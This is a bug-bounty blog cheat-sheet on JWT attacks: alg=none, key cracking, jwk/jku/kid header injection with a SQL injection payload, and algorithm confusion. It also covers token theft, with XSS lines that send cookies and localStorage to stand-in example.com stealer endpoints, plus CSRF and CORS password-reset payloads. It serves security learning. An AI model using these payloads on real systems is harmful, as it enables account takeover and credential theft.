<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<meta name="HandheldFriendly" content="True" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<meta name="generator" content="Hugo 0.110.0">


<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/dsrkafuu/dsr-cdn-main@1/images/favicons/dsrca.ico" />



<title>JWTs Attacks Cheat-Sheet - FlowHero&#39;s Blogs</title>




<meta name="keywords" content="API Hacking, Bug Bounty" />


<meta property="og:title" content="JWTs Attacks Cheat-Sheet" />
<meta name="twitter:title" content="JWTs Attacks Cheat-Sheet" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://flowhero.github.io/blogsite/docs/jwts-attacks/" /><meta property="og:description" content="Explore the most common JWTs Attacks !" />
<meta name="twitter:description" content="Explore the most common JWTs Attacks !" /><meta name="twitter:card" content="summary" /><meta property="article:published_time" content="2023-08-13T11:47:29+01:00" /><meta property="article:modified_time" content="2023-08-13T11:47:29+01:00" />


<style>
    @media (prefers-color-scheme: dark) {
        body[data-theme='auto'] img {
            filter: brightness(60%);
        }
    }

    body[data-theme='dark'] img {
        filter: brightness(60%);
    }
</style>




<link rel="stylesheet" href="https://flowhero.github.io/blogsite/assets/css/fuji.min.b4a21b5d3eb1d0a51297e31230a65fc25e387843e45ec3a2d9176cd8d163c216d99b9b13a618b28f537c3b559ec8a408183b0fbfad48daddb9befa7d3ef90eed.css" integrity="sha512-tKIbXT6x0KUSl&#43;MSMKZfwl44eEPkXsOi2Rds2NFjwhbZm5sTphiyj1N8O1WeyKQIGDsPv61I2t25vvp9PvkO7Q==" />








</head>

<body
  data-theme="auto"
  data-theme-auto='false'
  >
    <script data-cfasync="false">
  
  var fujiThemeData = localStorage.getItem('fuji_data-theme');
  
  if (!fujiThemeData) {
    localStorage.setItem('fuji_data-theme', 'auto');
  } else {
    
    if (fujiThemeData !== 'auto') {
      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
    }
  }
</script>

    <header>
    <div class="container-lg clearfix">
        <div class="col-12 header">
            <a class="title-main" href="https://flowhero.github.io/blogsite/">FlowHero&#39;s Blogs</a>
            
        </div>
    </div>
</header>

    <main>
        <div class="container-lg clearfix">
            
            <div class="col-12 col-md-9 float-left content">
                
<article>
    
    <h2 class="post-item post-title">
        <a href="https://flowhero.github.io/blogsite/docs/jwts-attacks/">JWTs Attacks Cheat-Sheet</a>
    </h2>
    <div class="post-item post-meta">
        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2023-08-13</span>



<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/blogsite/tags/api-hacking">API Hacking</a>&nbsp;<a href="/blogsite/tags/bug-bounty">Bug Bounty</a>&nbsp;</span>

    </div>
    
    <div class="post-content markdown-body">
        <h2 id="toolkits">Toolkits</h2>
<ul>
<li><a href="https://jwt.io" target="_blank">jwt.io</a></li>
<li><code>hashcat</code></li>
<li><code>JSON Web Key</code> Burp Extension</li>
<li><code>jwt_tool.py</code></li>
<li><code>rsa_sign2n</code></li>
</ul>
<p><img class="img-zoomable" src="https://flowhero.github.io/assets/images/shemas/1aAH0mMomx1dLidhoNCVmNw.png" alt="image" />
</p>
<h2 id="i---jwks-common-locations">I - JWKS common locations</h2>
<blockquote>
<p>If you don&rsquo;t know what JWTs are yet, please check <a href="https://jwt.io/introduction" target="_blank">https://jwt.io/introduction</a>, it&rsquo;ll take you about 5 minutes to read.</p>
</blockquote>
<p>First thing we can do, is looking for any exposed JWTs keys (or set of keys) on common locations (JSON Web Key Store) file. Some common locations for this would be:</p>
<ul>
<li>/.well-known/jwks.json</li>
<li>/openid/connect/jwks.json</li>
<li>/jwks.json</li>
<li>/api/keys</li>
<li>/api/v1/keys</li>
</ul>
<p>To automate this, you can use <code>common.txt</code> wordlist under Web-Contet directory on the SecLists Github Repository:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u <span style="color:#f92672">[</span>TARGET<span style="color:#f92672">]</span>.com/FUZZ -w ~/tools/SecLists-2023.2/Discovery/Web-Content/common.txt
</span></span></code></pre></div><p>There are two standard header claims that can direct the service to the <strong>Public Key</strong> for verification:</p>
<ul>
<li><strong>jku</strong> - a claim pointing towards the JWKS URL</li>
<li><strong>x5u</strong> - a claim pointing towards the X509 certificate location (could be in a JWKS file)</li>
</ul>
<p>This is how JWTs keys would look like :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{ 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;keys&#34;</span>: 
</span></span><span style="display:flex;"><span>[ 
</span></span><span style="display:flex;"><span>	{ 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;kty&#34;</span>: <span style="color:#e6db74">&#34;RSA&#34;</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;e&#34;</span>: <span style="color:#e6db74">&#34;AQAB&#34;</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&#34;</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;n&#34;</span>: <span style="color:#e6db74">&#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&#34;</span> 
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span> ]
</span></span></code></pre></div><h2 id="ii---attacks-on-jwt">II - Attacks on JWT</h2>
<h3 id="21---jwt-authentication-bypass-via-unverified-signature">2.1 - JWT authentication bypass via unverified signature</h3>
<ul>
<li>Just change the JWT body(=payload) and send the request leaving the signature as is and check if the server is checking the signature.
( For example if in the payload part of the token you can just change &ldquo;name&rdquo; to another user&rsquo;s name and use the updated token to see if you can access his account )</li>
</ul>
<h3 id="22---jwt-authentication-bypass-via-flawed-signature-verification">2.2 - JWT authentication bypass via flawed signature verification</h3>
<ul>
<li>Change Body</li>
<li>Change <em>alg</em> to <strong>none</strong></li>
<li>Remove Signature part (Not the dot at the end)</li>
</ul>
<h3 id="23---jwt-authentication-bypass-via-weak-signing-key">2.3 - JWT authentication bypass via weak signing key</h3>
<ul>
<li>Crack Key used for Signature</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">16500</span> &lt;YOUR-JWT&gt; /path/to/jwt.secrets.list
</span></span></code></pre></div><ul>
<li>Change body in <a href="https://jwt.io" target="_blank">jwt.io</a> and enter Key in Trailer field</li>
</ul>
<h3 id="24---jwt-authentication-bypass-via-jwk-header-injection">2.4 - JWT authentication bypass via jwk header injection</h3>
<ul>
<li>Generate RSA</li>
<li>Repeater -&gt; JSON Web Token TAB -&gt; Attack -&gt; Embedded JWK</li>
<li>Notice <em>jwk</em> added in header</li>
<li>Change body</li>
<li>Send request</li>
</ul>
<blockquote>
<p>Instead of using the built-in attack in the JWT Editor extension, you can embed a JWK by adding a <code>jwk</code> parameter to the header of the JWT manually. In this case, you need to also update the <code>kid</code> header of the token to match the <code>kid</code> of the embedded key.</p>
</blockquote>
<h3 id="25---jwt-authentication-bypass-via-jku-header-injection">2.5 - JWT authentication bypass via jku header injection</h3>
<ul>
<li>Generate RSA</li>
<li>Copy PK as JWK</li>
<li>Create an endpoint of the PK:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{ 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;keys&#34;</span>: 
</span></span><span style="display:flex;"><span>[ 
</span></span><span style="display:flex;"><span>	{ 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;kty&#34;</span>: <span style="color:#e6db74">&#34;RSA&#34;</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;e&#34;</span>: <span style="color:#e6db74">&#34;AQAB&#34;</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&#34;</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;n&#34;</span>: <span style="color:#e6db74">&#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&#34;</span> 
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span> ]
</span></span></code></pre></div><ul>
<li>Change <em>kid</em> in you cookie with the generated one and <strong>Inject</strong> <em>jku</em> in the header the link to the endpoint containing our key :</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{  
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;RS256&#34;</span>,  
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;jku&#34;</span>: <span style="color:#e6db74">&#34;https://mysite.com/keys.json&#34;</span>  
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Sign it in Burp <strong>JSON Web Key</strong> extention</li>
<li>Send request</li>
</ul>
<h3 id="26---jwt-authentication-bypass-via-kid-header">2.6 - JWT authentication bypass via kid header</h3>
<h4 id="261---path-traversal">2.6.1 - Path Traversal</h4>
<blockquote>
<p><code>kid</code> is an optional header claim which holds a key identifier, particularly useful when you have multiple keys to sign the tokens and you need to look up the right one to verify the signature.</p>
</blockquote>
<ul>
<li>Generate Symetric Key with <code>key = null byte</code> base64 encoded (AA==)</li>
</ul>
<p><img class="img-zoomable" src="https://flowhero.github.io/assets/images/shemas/2023_07_19_231603.png" alt="image" />
</p>
<ul>
<li>Change <em>kid</em> to <code>/dev/null</code> which represent Null byte</li>
<li>Change Body</li>
<li>Sign with the generated Key</li>
</ul>
<p><img class="img-zoomable" src="https://flowhero.github.io/assets/images/shemas/2023_07_19_232035.png" alt="image" />
</p>
<h4 id="262---sql-injection">2.6.2 - SQL Injection</h4>
<p>In a scenario where the content of the &ldquo;kid&rdquo; is used to retreive the password from the database, you could change the payload inside the &ldquo;kid&rdquo; parameter to: <code>non-existent-index' UNION SELECT 'ATTACKER';-- -</code> and then sign the JWT with the secret key <code>ATTACKER</code>.</p>
<h3 id="27---jwt-authentication-bypass-via-algorithm-confusion">2.7 - JWT authentication bypass via algorithm confusion</h3>
<p><a href="https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/" target="_blank">https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/</a></p>
<ul>
<li>Get <strong>Public Key</strong>
<ul>
<li>Get <strong>Public Keys</strong> from [[#JWKS common locations]]</li>
<li>or Crack it with <code>jwt_forgery.py</code></li>
<li>or use this :</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl s_client -connect example.com:443 2&gt;&amp;<span style="color:#ae81ff">1</span> &lt; /dev/null | sed -n <span style="color:#e6db74">&#39;/-----BEGIN/,/-----END/p&#39;</span> &gt; certificatechain.pem 
</span></span><span style="display:flex;"><span>openssl x509 -pubkey -in certificatechain.pem -noout &gt; pubkey.pem
</span></span></code></pre></div><p>Or we can use this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 jwt_forgery<span style="color:#f92672">.</span>py <span style="color:#f92672">&lt;</span>jwt1<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span>jwt2<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p><img class="img-zoomable" src="https://flowhero.github.io/assets/images/shemas/2023_07_20_003929.png" alt="image" />
</p>
<p>To verify if the public key generated is right :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 jwt_tool<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>V <span style="color:#f92672">-</span>pk <span style="color:#f92672">&lt;</span>jwt_key<span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">`</span> to verify <span style="color:#66d9ef">if</span> its right
</span></span></code></pre></div><p><img class="img-zoomable" src="https://flowhero.github.io/assets/images/shemas/2023_07_20_005548.png" alt="image" />
</p>
<p>Or you can verify by using the <strong>Tampered x509 JWT</strong> and sending the request, if you get <em>200</em> then it&rsquo;s your account and it is the correct X.509 key.  Else repeat the Public key derivation Process.</p>
<ul>
<li>
<p>Copy <strong>Public Key</strong> with the blank line at the end !!
<img class="img-zoomable" src="https://flowhero.github.io/assets/images/shemas/2023_07_20_011040.png" alt="image" />
</p>
</li>
<li>
<p><strong>PEM</strong> to <strong>JWK</strong></p>
</li>
<li>
<p>Generate RSA key using the <strong>JWK</strong> we got from <strong>PEM</strong></p>
</li>
<li>
<p>Generate New Symetric Key with <strong>base64 Encoded PEM</strong> in <em>k</em> value :</p>
</li>
</ul>
<p><img class="img-zoomable" src="https://flowhero.github.io/assets/images/shemas/2023_07_20_012443.png" alt="image" />
</p>
<ul>
<li>
<p>Change <code>alg</code> parameter to <code>HS256</code></p>
</li>
<li>
<p>Change body as you like</p>
</li>
<li>
<p>Sign it using the symetric Key</p>
</li>
<li>
<p>Send Request</p>
</li>
<li>
<p><a href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key" target="_blank">JWT authentication bypass via algorithm confusion with no exposed key</a></p>
</li>
</ul>
<h2 id="iii---stealing-jwts">III - Stealing JWTs</h2>
<hr>
<p>There&rsquo;s no need to hack JWTs if you can <strong>steal</strong> and replay them!</p>
<p>If you have other vulnerabilities in the application you may be able to steal or hijack the tokens of other users.</p>
<h3 id="31---xss">3.1 - XSS</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://example.com/cookiestealer.php?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">or</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://example.com/log.php?localStorage=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(window[<span style="color:#e6db74">&#39;localStorage&#39;</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">or</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://example.com/?password=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">secretPasswordVariable</span>;
</span></span></code></pre></div><h3 id="32---csrf">3.2 - CSRF</h3>
<p>JWT tokens stored in cookies (whether they are HTTPOnly or not) will be automatically sent by the browser when an authenticated user interacts with the target site. When a victim triggers a CSRF payload the browser will send the associated cookies including the token. The attacker won&rsquo;t be able to see these, but as they are being used to do the attacker&rsquo;s bidding that doesn&rsquo;t really matter.</p>
<p><strong>Example:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;form</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;autosubmit&#34;</span> <span style="color:#a6e22e">action=</span><span style="color:#e6db74">&#34;http://www.example.com/account/passwordreset&#34;</span> <span style="color:#a6e22e">enctype=</span><span style="color:#e6db74">&#34;text/plain&#34;</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;POST&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;input</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;victim1&#34;</span> <span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;input</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;BadGuyKnowsThis!&#34;</span> <span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;input</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Submit Request&#34;</span> <span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/form&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;script&gt;</span>
</span></span><span style="display:flex;"><span>document.getElementById(&#34;autosubmit&#34;).submit();
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/script&gt;</span>
</span></span></code></pre></div><h3 id="33---cors-misconfiguration">3.3 - CORS Misconfiguration</h3>
<p>When a site&rsquo;s CORS policy allows arbitrary origins as well as sending credentials it is possible to craft an attack page containing an XHR request to the webserver, while also capturing the response.</p>
<p><strong>This leads to two possible attack paths:</strong></p>
<ol>
<li>
<p>If the JWT is returned in any HTTP responses from the application, the token can be read by the attacker when the &rsquo;trigger&rsquo; request is sent. A good example of this is a JWT &lsquo;refresh token&rsquo; or queries to an account page or login page.</p>
</li>
<li>
<p>If the JWT is sent in a cookie then CORS can be used as a type of CSRF to send the token without the attacker needing to see it.</p>
</li>
</ol>
<p><strong>Example - XHR CORS:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://www.avictimwebsitewithJWTcookieauth.com/api/refreshtoken&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/json;charset=UTF-8&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p><strong>Example - XHR CSRF:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;http://www.avictimwebsitewithJWTcookieauth.com/api/passwordreset&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/json;charset=UTF-8&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;{&#34;newpass&#34;:&#34;BadGuyKnowsThis!&#34;}&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><h3 id="34---man-in-the-middle">3.4 - Man-in-the-Middle</h3>
<p>JWTs may also be seen in captured HTTP traffic, either in the header/body of unencrypted traffic, in log files of firewalls/gateways/other servers, in referrer links (if exposed as a URL parameter), or a range of other places.</p>

    </div>
</article>




            </div>
            <aside class="col-12 col-md-3 float-left sidebar">
    
    <div class="sidebar-item sidebar-pages">
        <h3>Pages</h3>
        <ul>
            
        </ul>
    </div>
    
    <div class="sidebar-item sidebar-links">
        <h3>Links</h3>
        <ul>
            
        </ul>
    </div>
    
    <div class="sidebar-item sidebar-tags">
        <h3>Tags</h3>
        <div>
            
            <span>
                <a href="/blogsite/tags/api-hacking/">API Hacking</a>
            </span>
            
            <span>
                <a href="/blogsite/tags/bug-bounty/">Bug Bounty</a>
            </span>
            
            <span>
                <a href="/blogsite/tags/web-hacking/">Web Hacking</a>
            </span>
            
        </div>
    </div>
    <div class="sidebar-item sidebar-toc">
        <h3>Table of Contents</h3><nav id="TableOfContents">
  <ul>
    <li><a href="#toolkits">Toolkits</a></li>
    <li><a href="#i---jwks-common-locations">I - JWKS common locations</a></li>
    <li><a href="#ii---attacks-on-jwt">II - Attacks on JWT</a>
      <ul>
        <li><a href="#21---jwt-authentication-bypass-via-unverified-signature">2.1 - JWT authentication bypass via unverified signature</a></li>
        <li><a href="#22---jwt-authentication-bypass-via-flawed-signature-verification">2.2 - JWT authentication bypass via flawed signature verification</a></li>
        <li><a href="#23---jwt-authentication-bypass-via-weak-signing-key">2.3 - JWT authentication bypass via weak signing key</a></li>
        <li><a href="#24---jwt-authentication-bypass-via-jwk-header-injection">2.4 - JWT authentication bypass via jwk header injection</a></li>
        <li><a href="#25---jwt-authentication-bypass-via-jku-header-injection">2.5 - JWT authentication bypass via jku header injection</a></li>
        <li><a href="#26---jwt-authentication-bypass-via-kid-header">2.6 - JWT authentication bypass via kid header</a></li>
        <li><a href="#27---jwt-authentication-bypass-via-algorithm-confusion">2.7 - JWT authentication bypass via algorithm confusion</a></li>
      </ul>
    </li>
    <li><a href="#iii---stealing-jwts">III - Stealing JWTs</a>
      <ul>
        <li><a href="#31---xss">3.1 - XSS</a></li>
        <li><a href="#32---csrf">3.2 - CSRF</a></li>
        <li><a href="#33---cors-misconfiguration">3.3 - CORS Misconfiguration</a></li>
        <li><a href="#34---man-in-the-middle">3.4 - Man-in-the-Middle</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
</aside>

        </div>
        <div class="btn">
    <div class="btn-menu" id="btn-menu">
        <i class="iconfont icon-grid-sharp"></i>
    </div>
    <div class="btn-toggle-mode">
        <i class="iconfont icon-contrast-sharp"></i>
    </div>
    <div class="btn-scroll-top">
        <i class="iconfont icon-chevron-up-circle-sharp"></i>
    </div>
</div>
<aside class="sidebar-mobile" style="display: none;">
  <div class="sidebar-wrapper">
    
    <div class="sidebar-item sidebar-pages">
        <h3>Pages</h3>
        <ul>
            
        </ul>
    </div>
    
    <div class="sidebar-item sidebar-links">
        <h3>Links</h3>
        <ul>
            
        </ul>
    </div>
    
    <div class="sidebar-item sidebar-tags">
        <h3>Tags</h3>
        <div>
            
            <span>
                <a href="/blogsite/tags/api-hacking/">API Hacking</a>
            </span>
            
            <span>
                <a href="/blogsite/tags/bug-bounty/">Bug Bounty</a>
            </span>
            
            <span>
                <a href="/blogsite/tags/web-hacking/">Web Hacking</a>
            </span>
            
        </div>
    </div>
    
    
    
    
  </div>
</aside>
    </main>

    <footer>
    <div class="container-lg clearfix">
        <div class="col-12 footer">
            
            <span>&copy; 2023
                <a href="https://flowhero.github.io/blogsite/"></a>
                
                | Powered by <a href="https://github.com/dsrkafuu/hugo-theme-fuji/"
                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
                                                    target="_blank">Hugo</a> 
            </span>
        </div>
    </div>
</footer>

    
<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js" integrity="sha512-q583ppKrCRc7N5O0n2nzUiJ+suUv7Et1JGels4bXOaMFQcamPk9HjdUknZuuFjBNs7tsMuadge5k9RzdmO+1GQ==" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.27.0/components/prism-core.min.js" integrity="sha512-LCKPTo0gtJ74zCNMbWw04ltmujpzSR4oW+fgN+Y1YclhM5ZrHCZQAJE4quEodcI/G122sRhSGU2BsSRUZ2Gu3w==" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.27.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha512-GP4x8UWxWyh4BMbyJGOGneiTbkrWEF5izsVJByzVLodP8CuJH/n936+yQDMJJrOPUHLgyPbLiGw2rXmdvGdXHA==" crossorigin="anonymous"></script>



<script defer src="/blogsite/assets/js/fuji.min.645f1123be695831f419ab54c1bcba327325895c740014006e57070d4f3e5d6b553e929c4b46f40ea707249e9c7f7c2a446d32a39ce7319f80a34525586a8e0f.js" integrity="sha512-ZF8RI75pWDH0GatUwby6MnMliVx0ABQAblcHDU8&#43;XWtVPpKcS0b0DqcHJJ6cf3wqRG0yo5znMZ&#43;Ao0UlWGqODw=="></script>



</body>

</html>
